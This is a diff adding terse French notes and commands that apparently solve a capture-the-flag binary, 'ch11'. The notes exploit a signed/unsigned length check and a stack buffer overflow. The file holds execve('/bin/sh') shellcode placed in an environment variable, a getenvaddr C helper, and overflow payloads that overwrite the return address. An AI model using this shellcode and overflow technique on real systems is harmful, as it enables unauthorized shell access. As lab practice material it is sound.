@@ -1,0 +1,30 @@
+#le programme prend un fichier en parametre. Il lit d'abord les 4 premiers octect en tant que int et les compare avec une macro qui est en unsigned int. Comme il y a un cast implicite, a comparaison se fera sous forme de int.
+#on commence alors par ecrire -1 dans le fichier, suivit d'un /, ensuite on peut ecrire ce que l'on veut
+#on met un scriptshell dans l'environnement, on choppe son adresse et on trouve l''eip pour y mettre l'adresse du scriptshell
+
+python -c "print '\xff\xff\xff\xff/' + 'a'*136" > /tmp/boo && ./ch11 /tmp/boo
+export cacahuete=`python -c "print'\x90'*50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+/tmp$ vi cacahuete.c
+le getenvaddr:
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+
+gcc cacahuete.c -o test
+/tmp/test11 cacahuete ch11
+python -c "print '\xff\xff\xff\xff/' + 'a'*140 + '\x58\xff\xff\xbf'" > /tmp/boo && ./ch11 /tmp/boo
+
+python -c "print '\x90\x90\x90\x90/' + 'A'*140 + '\x2a\xff\xff\xbf'" > /tmp/f11
+./ch11 /tmp/f11
